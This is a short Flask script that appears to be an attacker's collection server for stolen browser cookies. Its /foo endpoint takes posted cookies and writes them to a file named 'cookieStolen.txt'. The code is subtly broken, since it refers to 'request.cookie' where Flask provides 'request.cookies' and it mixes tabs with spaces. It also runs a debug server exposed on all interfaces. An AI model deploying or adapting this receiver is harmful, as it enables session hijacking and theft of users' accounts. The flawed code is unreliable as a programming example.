from flask import Flask, abort, request
import json

app = Flask(__name__)


@app.route('/foo', methods=['POST']) 
def foo():

    with open("cookieStolen.txt","w") as fo:
   		fo.write(json.dumps(request.cookie))
    return json.dumps(request.cookie)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

